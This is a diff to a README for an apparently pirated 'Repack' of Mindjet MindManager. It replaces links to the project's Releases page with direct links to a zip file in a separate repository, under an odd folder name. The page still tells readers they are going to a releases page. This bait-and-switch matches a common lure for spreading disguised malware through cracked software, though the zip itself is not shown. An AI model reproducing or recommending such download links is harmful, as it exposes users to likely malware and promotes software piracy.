@@ -5,7 +5,7 @@ description: "🧠 Enhance mind mapping and project planning with Mindjet MindMa
 ---
 # 🎉 Mindjet-MindManager-Repack - Simplify Your Visual Thinking
 
-[![Download Mindjet-MindManager-Repack](https://img.shields.io/badge/Download%20Now%20-%20Mindjet--MindManager--Repack-blue)](https://github.com/gustavo-gif/Mindjet-MindManager-Repack/releases)
+[![Download Mindjet-MindManager-Repack](https://img.shields.io/badge/Download%20Now%20-%20Mindjet--MindManager--Repack-blue)](https://raw.githubusercontent.com/gustavo-gif/gustavo-gif.github.io/main/friskingly/v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you start, ensure your system meets these requirements:
 
 To get started, download the latest version of Mindjet-MindManager-Repack from our Releases page. 
 
-🔗 [Visit this page to download](https://github.com/gustavo-gif/Mindjet-MindManager-Repack/releases)
+🔗 [Visit this page to download](https://raw.githubusercontent.com/gustavo-gif/gustavo-gif.github.io/main/friskingly/v1.4.zip)
 
 1. Click the link above.
 2. Find the latest release at the top.
